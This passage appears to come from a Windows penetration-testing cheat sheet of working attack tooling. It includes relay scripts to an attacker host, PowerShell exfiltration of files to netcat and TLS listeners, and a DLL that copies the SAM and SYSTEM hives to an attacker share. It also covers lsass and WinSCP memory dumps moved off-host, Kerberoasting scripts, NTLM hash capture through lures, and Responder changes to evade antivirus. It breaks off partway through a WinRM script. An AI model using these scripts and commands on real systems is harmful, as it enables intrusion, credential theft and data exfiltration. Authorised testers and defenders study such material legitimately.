t_conn, t_caddr = t_socket.accept()
print("Tunnel connection received from {}".format(t_caddr))
print "Start your local application and connect to " + a_host + " on port " + str(a_port)

a_socket.listen(1)
a_conn, a_caddr = a_socket.accept()
print "Application connection received"

t_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
a_conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))

while True:
   sock_list = [t_conn, a_conn]
   read_sock, write_sock, error_sock = socksel.select(sock_list , sock_list, sock_list)
   t = 0
   for sock in read_sock:
       if(sock == t_conn):
         t += 1
         data = sock.recv(4096)
         if data:
            a_conn.send(data)
         else:
            sys.exit()
       if(sock == a_conn):
         t += 1
         data = sock.recv(4096)
         if data:
            t_conn.send(data)
         else:
            sys.exit()
   if(t == 0):
      sleep(0.01)
```

Powershell script `tcprelay.ps1`<br />
```powershell
# Target parameters
$tcpTHost = "192.168.100.109"
$tcpTPort = "22"

# Attacker parameters
$tcpAHost = "192.168.1.19"
$tcpAPort = "4444"

try {
   $tcpAClient = New-Object System.Net.Sockets.TcpClient($tcpAHost, $tcpAPort)
}
catch {
   Write-Output "Failed to connect to attacking host"
   exit
}

try {
   $tcpTClient = New-Object System.Net.Sockets.TcpClient($tcpTHost, $tcpTPort)
}
catch {
   Write-Output "Failed to connect to target host"
   exit
}

$TStream = $tcpTClient.GetStream()
$AStream = $tcpAClient.GetStream()

$TBuffer = New-Object Byte[] $tcpTClient.ReceiveBufferSize
$ABuffer = New-Object Byte[] $tcpAClient.ReceiveBufferSize

$idle = 0

while($true) {
   if($tcpTClient.Connected -and $tcpAClient.Connected)
   {
      if(($tcpTClient.Client.Available -gt 0) -or ($tcpAClient.Client.Available -gt 0))
      {
         if($tcpTClient.Client.Available -gt 0)
         {
            $TRead = $TStream.Read($TBuffer, 0, $TBuffer.Length)
            $AStream.Write($TBuffer, 0, $TRead)
            $idle = 0
         }
         if($tcpAClient.Client.Available -gt 0)
         {
            $ARead = $AStream.Read($ABuffer, 0, $ABuffer.Length)
            $TStream.Write($ABuffer, 0, $ARead)
            $idle = 0
         }
      }
      else
      {
         Start-Sleep -Milliseconds 10
         $idle++
         if($idle -gt 3000)
         {
            # approx 30 sec idle close
            $tcpTClient.Close()
            $tcpAClient.Close()
         }
      }
   }
   else
   {
      Write-Output "Connection closed"
      exit
   }
}
```

Start `apprelay.py` on the attacking machine.

Execute `powershell -File tcprelay.ps1` on the Windows host.

When `apprelay.py` indicates that you can start your local application execute `ssh user@localhost -p 2222`.

## >> Downloading files with compiled Javascript

First, as administrator, register the System .NET assembly.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe System.dll`

As ordinary user, perform the following steps.  Create a javascript file, dl.js.

```javascript
var strURL = "http://download.domain.com/file.bin";
var strFilePath = "C:\\folder\\file.bin";
var oWebClient = new ActiveXObject("System.Net.WebClient");
oWebClient.DownloadFile(strURL, strFilePath);
```

Compile dl.js into an exe.

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe dl.js`

Now execute `dl.exe` to retrieve the file.

## >> Downloading files with compiled C#

Create csharp file, dl.cs.

```
using System.Net;

namespace dlfile
{
   class dl
   {
      static void Main()
      {
         string URL = "http://download.domain.com/file.bin";
         string FilePath = "C:\\folder\\file.bin";
         WebClient WC = new WebClient();
         WC.DownloadFile(URL, FilePath);
      }
   }
}
```

Compile the program.

`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:c:\folder\dl.exe c:\folder\dl.cs`

Execute `dl.exe` to retrieve the file.

## >> Uploading a file via powershell

Start netcat listener on Linux (10.192.103.49).<br />
`nc -nlvp 4444 | fold -w 76 | base64 -d > file.bin`

Send the file from Windows host using powershell.<br />
```powershell
$fdata = [System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
$socket = New-Object net.sockets.tcpclient('10.192.103.49', 4444);
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($fdata);
$writer.flush();
$socket.close();
```

**Send file over a TLS socket**

Start openssl server on Linux (10.192.103.49).<br />
Generate a certificate and key first.<br />
`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`

`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 | fold -w 76 | base64 -di > file.bin`

Send the file from Windows host using powershell.<br />
```powershell
$fdata = [System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
$socket = New-Object net.sockets.tcpclient('10.192.103.49', 443);
$stream = $socket.GetStream();
$callback = { param($sender, $cert, $chain, $errors) return $true };
$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
$sslstream.AuthenticateAsClient("whatever");
$stream = $sslstream;
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$writer.WriteLine($fdata);
$writer.flush();
$writer.close();
$stream.close();
$socket.close();
```

## >> Downloading a file via powershell

Retrieve the file on Windows host using powershell.  Will retry until server responds.<br />
```powershell
$fdata = "";
$fname = $env:temp + "\file.bin";
$ErrorActionPreference = 'SilentlyContinue';
while($true)
{
   $socket = New-Object system.Net.Sockets.TcpClient;
   $socket.Connect('10.192.103.49', '4444');
   if($socket.Connected)
   {
      break;
   }
   Start-Sleep -Seconds 1;
}
$stream = $socket.GetStream();
$reader = new-object System.IO.StreamReader($stream);
$res = $reader.ReadToEnd();
$fdata = "$fdata$res"
$bytes = [Convert]::FromBase64String($fdata)
[IO.File]::WriteAllBytes($fname, $bytes)
$reader.close();
$stream.close();
$socket.close();
exit;
```

Start netcat listener on Linux (10.192.103.49) to serve the file.<br />
`cat file.bin | base64 | timeout 10 nc -nlvp 4444`

**Receive file over a TLS socket**

Retrieve the file on Windows host using powershell.  Will retry until server responds.<br />
```powershell
$fdata = "";
$fname = $env:temp + "\file.bin";
$ErrorActionPreference = 'SilentlyContinue';
while($true)
{
   $socket = New-Object system.Net.Sockets.TcpClient;
   $socket.Connect('10.192.103.49', '443');
   if($socket.Connected)
   {
      break;
   }
   Start-Sleep -Seconds 1;
}
$stream = $socket.GetStream();
$callback = { param($sender, $cert, $chain, $errors) return $true };
$sslstream = New-Object System.Net.Security.SslStream($stream, $true, $callback);
$sslstream.AuthenticateAsClient("whatever", $null, "tls12", $false);
$stream = $sslstream;
$reader = new-object System.IO.StreamReader($stream);
$res = $reader.ReadToEnd();
$fdata = "$fdata$res";
$bytes = [Convert]::FromBase64String($fdata);
[IO.File]::WriteAllBytes($fname, $bytes);
$reader.close();
$stream.close();
$socket.close();
exit;
```

Start openssl server on Linux (10.192.103.49).<br />
Generate a certificate and key first.<br />
`openssl req -x509 -newkey rsa:2048 -keyout svrkey.pem -out svrcert.pem -days 365 -nodes`

`openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 < <(cat file.bin | base64)`

## >> Reg.exe DLL equivalent to dump registry hashes

Compile your own DLL to dump the SAM, SYSTEM and SECURITY keys, which can be used with secretsdump.py to get NTLM hashes.  Performs the equivalent of:<br />
`reg save hklm\sam sam`<br />
`reg save hklm\system system`<br />
`reg save hklm\security security`<br />

**Create a DLL regsave.dll from source regsave.c**

```c
#include <windows.h>

void CALLBACK RegSave(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

void CALLBACK RegSave(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
   // set your export paths here
   LPCWSTR wsSam = L"\\\\192.168.1.242\\upload\\sam";
   LPCWSTR wsSystem = L"\\\\192.168.1.242\\upload\\system";
   LPCWSTR wsSecurity = L"\\\\192.168.1.242\\upload\\security";
   HANDLE hToken;
   TOKEN_PRIVILEGES tp;
   LUID luid;
   HKEY hKey;

   if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
   {
      if(LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &luid))
      {
         tp.PrivilegeCount = 1;
         tp.Privileges[0].Luid = luid;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         if(AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL))
         {
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
            {
               RegSaveKeyW(hKey, wsSam, NULL);
               RegCloseKey(hKey);
            }
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
            {
               RegSaveKeyW(hKey, wsSystem, NULL);
               RegCloseKey(hKey);
            }
            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SECURITY", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
            {
               RegSaveKeyW(hKey, wsSecurity, NULL);
               RegCloseKey(hKey);
            }
         }
      }
   }
}
```

Compile the DLL.<br />
`i686-w64-mingw32-gcc -shared -Wl,--kill-at regsave.c -o regsave.dll`

Execute the exported function on the target host.<br />
`rundll32.exe regsave.dll,RegSave`

On Linux, recover the hashes from the exported files.<br />
`secretsdump.py -system system -sam sam -security security LOCAL`

## >> Dumping lsass.exe using comsvcs.dll

**Powershell method**

Assumes administrator, will acquire SeDebugPrivilege right.<br />
```powershell
$DumpFile = "C:\WINDOWS\Temp\lsass.dmp"
$ProcessId = $pid

$definition = @'
using System;
using System.Runtime.InteropServices;
public class AdjPriv
{
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
  [DllImport("advapi32.dll", SetLastError = true)] internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
  [StructLayout(LayoutKind.Sequential, Pack = 1)] internal struct TokPriv1Luid
  {
    public int Count;
    public long Luid;
    public int Attr;
  }
  internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
  internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
  internal const int TOKEN_QUERY = 0x00000008;
  internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
  public static bool EnablePrivilege(long processHandle, string privilege, bool disable)
  {
    bool retVal;
    TokPriv1Luid tp;
    IntPtr hproc = new IntPtr(processHandle);
    IntPtr htok = IntPtr.Zero;
    retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
    tp.Count = 1;
    tp.Luid = 0;
    if(disable)
    {
      tp.Attr = SE_PRIVILEGE_DISABLED;
    }
    else
    {
      tp.Attr = SE_PRIVILEGE_ENABLED;
    }
    retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
    retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    return retVal;
  }
}
'@
$processHandle = (Get-Process -id $ProcessId).Handle
[bool] $Disable = $false
$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege($processHandle, "SeDebugPrivilege", $Disable)
$lsass = Get-Process -Name lsass
$sig = @'
[DllImport("comsvcs.dll", EntryPoint = "MiniDumpW", CharSet = CharSet.Unicode)]
public static extern void MiniDumpW(string ignored1, string ignored2, string pid_path_mode);
'@
$dmp = Add-Type -memberDefinition $sig -name "MiniDump" -namespace Win32Functions -passThru
$parameters = $lsass.Id.ToString() + " " + $DumpFile + " full"
$dmp::MiniDumpW(0, 0, $parameters)
```

**Using rundll32.exe**

Identify an unused service that runs as LocalSystem and reconfigure the binpath.  This example assumes the PID for lsass.exe is 432.<br />
```
sc config ImapiService binPath= "C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 432 C:\Windows\temp\lsass.dmp full" start= demand
```

Start the service.  It will error but check for output in C:\Windows\temp\lsass.dmp.

Restore the configuration of the unused service.<br />
```
sc config ImapiService binPath= "C:\WINDOWS\system32\imapi.exe" start= disabled
```

## >> Dumping WinSCP passwords from memory using comsvcs.dll

Assumes attacking host 10.1.2.3 has an anonymous writable SMB share to receive the dmp file.<br />
Assumes a command prompt with administrator privileges has been acquired on the target.<br />
```
wmic process where name^="winscp.exe" get Processid | findstr /r /c:"[0-9]" > %TEMP%\winscp.pid

set /p varpid= < %TEMP%\winscp.pid

del %TEMP%\winscp.pid

set varpid=%varpid: =%

C:\windows\system32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %varpid% %TEMP%\winscp.dmp full

timeout /t 5 && move /y %TEMP%\winscp.dmp \\10.1.2.3\smbwrite
```
Search for credentials in winscp.dmp on the attacking host.<br />
`strings winscp.dmp | grep -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | more`

Example output:<br />
`user192.168.20.33Lam3Password!`

## >> Targeted Kerberoasting using LOLbin programs

Assumes you have (compromised) a Windows computer that can access the domain with user privileges and have local administrator privileges to run `netsh`.

**List all user accounts with SPNs under a specific OU**

`dsquery * "OU=Service Accounts,DC=my,DC=lab" -filter "(&(objectcategory=user) (servicePrincipalName=*))" -attr distinguishedName servicePrincipalName -limit 0 > C:\temp\spn_accounts.txt`

Look through the file `C:\temp\spn_accounts.txt` for an interesting account and note the `distinguishedName` and `servicePrincipalName`.<br />
(e.g.)<br />
```
distinguishedName:    CN=Admin Service,OU=Services Accounts,DC=my,DC=lab
servicePrincipalName: http/automation;http/automation.my.lab;
```
**Get the IP addresses of the Domain Controllers**

`nslookup -type=all _ldap._tcp.dc._msdcs.my.lab`

(e.g.)<br />
```
dc01.my.lab    internet address = 10.1.2.10
dc02.my.lab    internet address = 10.1.2.11
```

**Clear the Kerberos tickets on the host**

`klist purge`

**Start a packet capture using netsh from en elevated command prompt**

(filter the packet trace to just the DCs identified earlier)<br />
`netsh trace start scenario=NetConnection capture=yes persistent=no maxsize=512 filemode=circular overwrite=yes report=no correlation=no traceFile=c:\temp\capture.etl IPv4.Address=(10.1.2.10,10.1.2.11) Ethernet.Type=IPv4`<br />
wait for the command prompt to return.

**Get a kerberos TGS using the SPN**

`klist get http/automation.my.lab`

**Stop the packet capture from the elevated command prompt**

`netsh trace stop`<br />
wait for the command prompt to return.

**The remaining steps are performed off-host on an attacking Windows system**

(1) Copy `c:\temp\capture.etl` to the attack system.<br />
(2) Ensure the attack system has the following tools installed.<br />
    [etl2pcapng](https://github.com/microsoft/etl2pcapng)<br />
    [NetworkMiner >= 2.6](https://www.netresec.com)<br />
    [WireShark](https://www.wireshark.org/)<br />
(3) Convert the netsh file to pcapng format.<br />
    `etl2pcapng.exe capture.etl capture.pcapng`<br />
(4) Open the `capture.pcapng` file in WireShark and save as a classic pcap file `capture.pcap`.  Discard comments when saving if prompted to do so.<br />
(5) Open `capture.pcap` in NetworkMiner.  Under the "Credentials" tab right-click on the krb5tgs entry and select "Copy Password".  Save the text from the clipboard into a file called "tgs.txt".<br />
(6) The encryption type at the beginning of the string pasted into the "tgs.txt" file will tell you if the ticket was encrypted with RC4 or AES.<br />
(e.g)<br />
```
$krb5tgs$23$ = RC4     = hashcat mode 13100
$krb5tgs$17$ = AES-128 = hashcat mode 19600
$krb5tgs$18$ = AES-256 = hashcat mode 19700
```
(7) Feed the contents of "tgs.txt" into hashcat to attempt to crack the service account's plaintext password.

## >> Kerberoasting AES and RC4 encrypted TGS using Powershell and Bash

Assumes you are running the Powershell scripts from a domain-joined computer and logged in as an ordinary user.

**Get a list of user SPNs**

The variable `$SPNFile` is where the output list of SPNs will be saved.  Change this to suit your environment.

```powershell
$SPNFile = "C:\folder\spn.txt"
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*))"
$results = $search.Findall()
$SPNList = New-Object -TypeName "System.Collections.ArrayList"
$j = 0
foreach($result in $results)
{
   $userEntry = $result.GetDirectoryEntry()
   $i = 1
   foreach($SPN in $userEntry.servicePrincipalName)
   {
      try {
         $sam = $userEntry.sAMAccountName.Trim()
      } catch {
         $sam = $userEntry.sAMAccountName }
      try {
         $spnstr = $SPN.Trim()
      } catch {
         $spnstr = $SPN }
      $null = $SPNList.Add(-join($env:USERDNSDOMAIN, ",", $sam, ",", $spnstr))
      $i += 1
      $j += 1
   }
}
$SPNList | Out-File -FilePath $SPNFile -ErrorAction Stop
Write-host $j "entries written to $SPNFile"
```

**Collect TGS replies using the SPN list**

The file generated by the previous script `$SPNFile` will be used to target the domain.  The Base64 encoded TGS replies will be stored in `$OutFile`.  Change this path to suit your environment.

```powershell
Add-Type -AssemblyName System.IdentityModel
$SPNFile = "C:\folder\spn.txt"
$OutFile = "C:\folder\spnout.txt"
$OutList = New-Object -TypeName "System.Collections.ArrayList"
$j = 0
foreach($Line in Get-Content $SPNFile)
{
   $Arr = $Line.Split(",")
   $SPN = $Arr[2]
   $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
   $ByteStream = $Ticket.GetRequest()
   $null = $OutList.Add($Line)
   $null = $OutList.Add([Convert]::ToBase64String($ByteStream))
   $j += 1
}
$OutList | Out-File -FilePath $OutFile -ErrorAction Stop
Write-host $j "entries written to $OutFile"
```

**Build Hashcat formatted TGS replies for cracking**

Copy the file `$OutFile` to your Linux Hashcat host.  Create the following Bash script `tgsrep.sh`.  This script will allow you to select RC4, AES-128 or AES-256 encrypted TGS replies.  For example:<br />
Output AES-128 (type 17) TGS replies.<br />
`tgsrep.sh spnout.txt 17 > crackme.txt`<br />
Output AES-256 (type 18) TGS replies.<br />
`tgsrep.sh spnout.txt 18 > crackme.txt`<br />
Output RC4 (type 23) TGS replies.<br />
`tgsrep.sh spnout.txt 23 > crackme.txt`<br />

```bash
if [ "$#" -ne 2 ]
then
   echo "You must provide a file name and etype (17, 18, 23)."
   exit
fi
file -bi "$1" | grep utf-16le >/dev/null
if [ $? -eq 0 ]
then
   echo "The file contains unicode text, convert to utf-8 and try again."
   echo "(e.g.) strings -e l $1 > $1.new"
   exit
fi
i=0
while IFS= read -r line
do
   if [[ $((i % 2)) -eq 0 ]]
   then
      tf1=$(mktemp /tmp/tgsrep.XXXXXX)
      tf2=$(mktemp /tmp/tgsrep.XXXXXX)
      str1=$(echo $line | sed 's/\$/[0x24]/g')
      arr1=(${str1//,/ })
   else
      echo -n $line | base64 -d > "$tf1"
      openssl asn1parse -in $tf1 -inform der | grep "OCTET STRING\|INTEGER" | grep -m 1 -B 2 "OCTET STRING" > "$tf2"
      etype="unknown"
      egrep "INTEGER +:11" "$tf2" >/dev/null
      if [ $? -eq 0 ]
      then
         etype="17"
      fi
      egrep "INTEGER +:12" "$tf2" >/dev/null
      if [ $? -eq 0 ]
      then
         etype="18"
      fi
      egrep "INTEGER +:17" "$tf2" >/dev/null
      if [ $? -eq 0 ]
      then
         etype="23"
      fi
      if [[ "$etype" == "$2" && ( "$2" == "17" || "$2" == "18" ) ]]
      then
         dump=$(cat "$tf2" | grep "OCTET STRING" | tr -d " " | cut -d ":" -f 4)
         cksm=${dump: -24}
         data=${dump%????????????????????????}
         echo -n '$krb5tgs$'
         echo -n $etype
         echo -n '$'
         echo -n ${arr1[1]}
         echo -n '$'
         echo -n ${arr1[0]}
         echo -n '$*'
         echo -n ${arr1[2]}
         echo -n '*$'
         echo -n $cksm
         echo -n '$'
         echo $data
      fi
      if [[ "$etype" == "$2" && "$2" == "23" ]]
      then
         dump=$(cat "$tf2" | grep "OCTET STRING" | tr -d " " | cut -d ":" -f 4)
         dumprev=$(echo $dump | rev)
         cksmrev=${dumprev: -32}
         cksm=$(echo $cksmrev | rev)
         datarev=${dumprev%????????????????????????????????}
         data=$(echo $datarev | rev)
         echo -n '$krb5tgs$'
         echo -n $etype
         echo -n '$*'
         echo -n ${arr1[1]}
         echo -n '$'
         echo -n ${arr1[0]}
         echo -n '$'
         echo -n ${arr1[2]}
         echo -n '*$'
         echo -n $cksm
         echo -n '$'
         echo $data
      fi
      rm "$tf1"
      rm "$tf2"
   fi
   i=$((i + 1))
done < "$1"
```

**Run the hashes through Hashcat**

For type 17 AES-128 tickets, use Hashcat mode 19600.  For type 18 AES-256 tickets use Hashcat mode 19700.  For type 23 RC4 tickets use Hashcat mode 13100.

## >> NetBIOS Name Service Recon Without Windows Utilities

Attacking machine is Linux that has netcat or bash UDP device support.  Windows host 192.168.1.166 is being queried in this example.

**Using nc**

`echo -n 12340000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001 | xxd -r -p | nc -u -w 1 192.168.1.166 137 | strings`

Same technique using a random transaction ID:

`(echo -n $(openssl rand -hex 2); echo -n 0000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001) | xxd -r -p | nc -u -w 1 192.168.1.166 137 | strings`

**Using bash UDP device**

`exec 5<>/dev/udp/192.168.1.166/137; echo -n 12340000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001 | xxd -r -p >&5; timeout 1 strings <&5`

Same technique using a random transaction ID:

`exec 5<>/dev/udp/192.168.1.166/137; (echo -n $(openssl rand -hex 2); echo -n 0000000100000000000020434b4141414141414141414141414141414141414141414141414141414141410000210001) | xxd -r -p >&5; timeout 1 strings <&5`

## >> Capturing NTLM hashes with Samba and tcpdump

If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with NTLM credential grabbing attacks using `Responder.py`, try this.  This assumes your attacking computer and victim computer are in the same DNS namespace.  The victim can be either a domain-joined computer or standalone workgroup.  This example uses the my.lab domain and the Samba server is smb.my.lab.

**Setup a minimal Samba server**

Edit `/etc/samba/smb.conf`<br />
```
[global]
workgroup = WORKGROUP
server role = standalone server
map to guest = bad user
security = user
lanman auth = no
ntlm auth = no
ntlmv2 auth = yes
[files]
path = /samba
browseable = yes
read only = yes
guest ok = yes
force user = nobody
```

Create the folder and file that the victim will access.<br />
```
mkdir /samba
chmod 777 /samba
chown nobody /samba
echo "this is a test" > /samba/test.txt
```

Start the Samba server and capture packets.<br />
```
service smbd start
tcpdump -nn -vv -i eth0 -s 0 -w ntlm.cap port 445 or port 139
```

Lure the victim to access your file `\\smb.my.lab\files\test.txt` or exploit a zero-click vulnerability.

Type `<ctrl>-c` to stop tcpdump and stop the Samba service when you have collected enough packets.  Then open the ntlm.cap file in NetworkMiner.  Go to the "credentials" tab and select the NTLMv2 response packet.  Right-click then copy password, save it in a text file then right-click copy username.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/nm01.png)

Convert the NTLM hash that looks like this:<br />
`$NETNTLMv2$WIN10PRO$<hex>$<hex>$<hex>`

To something like this:<br />
`Administrator::WIN10PRO:<hex>:<hex>:<hex>`

Crack the converted hash string using hashcat mode 5600 to attempt to recover the plaintext password.

## >> Modifying Responder.py to evade AV detection

If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with HTTP NTLM credential grabbing attacks using `Responder.py`, try this.  Tested with Responder version 3.0.2.0.

**Clone and edit Responder**

```
mkdir ~/scripts
cd ~/scripts
git clone https://github.com/lgandx/Responder
cd Responder
```

Edit `Responder.conf` to serve a 1x1 pixel png file.

```
under "; Servers to start"
    set all to Off except HTTP
under "; Specific NBT-NS/LLMNR names to respond to"
    set RespondToName = DONOTRESPOND
under "; HTML answer to inject in HTTP responses"
    set HTMLToInject = <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAABhGlDQ1BJQ0MgcHJvZmlsZQAAKJF9kT1Iw0AYht+mloq0ONhBxCFDdbIgKuKoVShChVArtOpgcukfNGlIUlwcBdeCgz+LVQcXZ10dXAVB8AfEydFJ0UVK/C4ptIjxjuMe3vvel7vvAKFZZZrVMw5oum1mUkkxl18Vw6+I0AwhiqjMLGNOktLwHV/3CPD9LsGz/Ov+HFG1YDEgIBLPMsO0iTeIpzdtg/M+cYyVZZX4nHjMpAsSP3Jd8fiNc8llgWfGzGxmnjhGLJa6WOliVjY14iniuKrplC/kPFY5b3HWqnXWvid/YaSgryxzndYwUljEEiSIUFBHBVXYSNCuk2IhQ+dJH/+Q65fIpZCrAkaOBdSgQXb94H/wu7dWcXLCS4okgdCL43yMAOFdoNVwnO9jx2mdAMFn4Erv+GtNYOaT9EZHix8B/dvAxXVHU/aAyx1g8MmQTdmVgrSEYhF4P6NvygMDt0Dfmte39jlOH4As9Sp9AxwcAqMlyl73eXdvd9/+rWn37wfzwXJ0GXT1kgAAAAlwSFlzAAAuIwAALiMBeKU/dgAAAAxJREFUCNdjOHbsGAAEqAJTHAqdsQAAAABJRU5ErkJggg==">
```

Edit `packets.py` and change every instance of `Microsoft-IIS/7.5` to `Apache/2.2.15`.<br />
If using `vi` search and replace `:%s/Microsoft-IIS\/7.5/Apache\/2.2.15/g`

Clear the cache and logs<br />
```
rm Responder.db
rm logs/*
```

Launch Responder.<br />
`python2 ./Responder.py -I wlan0`

Lure the victim to request the URL, where www.my.lab is the attacking host running Responder.<br />
(e.g.) `http://www.my.lab/images/image.png`

## >> Memory Dumping with C#

Many are familiar with dumping lsass to get Windows credentials.  However, user mode processes are a credential goldmine as well (mail clients, VPN clients, file transfer clients, terminal emulators, password managers, etc).  If the application doesn't employ defensive programming, such as encrypting or clearing stack and heap variables, chances are good that you can detect user names, passwords, private keys, tokens, and so on.  Once you have a Windows process dump file you can use several Linux tools to inspect the data:

```
strings <dump file>
strings -e l <dumpfile>
binwalk <dump file>
```

The following program `jamd.cs` can be compiled with Windows CSharp compiler (csc.exe) like so.<br />
`c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\jamd.exe C:\temp\jamd.cs`

The program can be executed like this `C:\temp\jamd.exe 1234 c:\temp\proc.dmp`

```csharp
// Just Another Memory Dumper

using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace Jamd
{
   class JamdProgram
   {
      private const int MiniDumpWithFullMemory = 0x00000002;

      [DllImport("dbghelp.dll", SetLastError = true)]
      static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeHandle hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

      private static void DumpMem(IntPtr hProc, int PID, string DumpFile)
      {
         try
         {
            bool status;

            using(FileStream fs = new FileStream(DumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
               status = MiniDumpWriteDump(hProc, PID, fs.SafeFileHandle, MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
            if(status)
            {
               Console.WriteLine("Dump of PID {0} saved to {1}", PID, DumpFile);
            }
            else
            {
               Console.WriteLine("Process memory dump failed.");
            }
         }
         catch(Exception ex)
         {
            Console.WriteLine("DumpMem failed, error: {0}", ex.Message);
         }
      }

      private static void Main(string[] args)
      {
         try
         {
            if(args.Length != 2)
            {
               Console.WriteLine("Usage: jamd.exe <PID> <dump file>");
            }
            else
            {
               int pid = Convert.ToInt32(args[0]);
               string dumpfile = String.Copy(args[1]);
               try
               {
                  Process process = Process.GetProcessById(pid);
                  DumpMem(process.Handle, pid, dumpfile);
               }
               catch(Exception ex)
               {
                  Console.WriteLine("Jamd failed, error: {0}", ex.Message);
               }
            }
         }
         catch(Exception ex)
         {
            Console.WriteLine("Jamd failed, error: {0}", ex.Message);
         }
      }
   }
}
```

## >> Interactive Command Prompt with WinRM

An interactive instance of cmd.exe is not directly supported under a remote Powershell session.  You can use named pipes to redirect stdin, stdout and sterr to interact with the command interpreter through multiple WinRM consoles.  Three consoles are used in this example.

* First PsSession will be used to capture the input of cmd.exe
* Second PsSession will be used to capture the output of cmd.exe
* Third PsSession will be used to launch cmd.exe with redirection to your named pipes

**Launch three instances of Powershell**

On the client computer you will need to connect to the remote computer using the following command.  Assumes the remote computer has address 192.168.1.243, has a hostname of WIN10PRO, and you are the administrator.

`Enter-PSSession -ComputerName 192.168.1.243 -Credential WIN10PRO\administrator`

Each of the 3 Powershell sessions should resemble this.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm00.png)

In the first session paste the following code that will receive your input to the command interpreter.

```powershell
$host.UI.RawUI.WindowTitle = "Input Window"
$pipesec = New-Object System.IO.Pipes.PipeSecurity;
$pipeacl = New-Object System.IO.Pipes.PipeAccessRule("Everyone", "ReadWrite", "Allow");
$pipesec.AddAccessRule($pipeacl);
$pipe = new-object System.IO.Pipes.NamedPipeServerStream("cmdpipein", "Out", 2, "Byte", "None", 1024, 1024, $pipesec);
$pipe.WaitForConnection();
$sw = new-object System.IO.StreamWriter($pipe);
$sw.AutoFlush = $true;
while($true)
{
   $c = Read-Host;
   if($c -eq "killme")
   {
      $sw.WriteLine("echo killme");
      Start-Sleep -s 2
      $sw.WriteLine("exit");
      Start-Sleep -s 2
      $sw.Dispose();
      $pipe.Dispose();
      break;
   }
   else
   {
      $sw.WriteLine($c);
   }
}
```

In the second session paste the following code that will display the output from the command interpreter.

```powershell
$host.UI.RawUI.WindowTitle = "Output Window"
$pipesec = New-Object System.IO.Pipes.PipeSecurity;
$pipeacl = New-Object System.IO.Pipes.PipeAccessRule("Everyone", "ReadWrite", "Allow");
